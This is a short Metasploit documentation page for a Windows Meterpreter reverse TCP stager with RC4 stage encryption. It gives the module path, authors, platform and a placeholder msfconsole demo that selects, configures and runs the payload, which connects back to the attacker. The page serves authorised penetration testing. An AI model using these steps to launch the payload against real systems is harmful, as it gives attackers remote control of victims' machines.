## Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption)

Inject the meterpreter server DLL (staged). Connect back to 
the attacker


## Module Name
payload/windows/patchupmeterpreter/reverse_tcp_rc4

## Authors
* skape
* jt <jt@klake.org>
* hdm
* sf
* mihi





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/patchupmeterpreter/reverse_tcp_rc4
msf payload(reverse_tcp_rc4) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_rc4) > set TARGET <target-id>
msf payload(reverse_tcp_rc4) > show options
   ... show and set options ...
msf payload(reverse_tcp_rc4) > run
```
    
    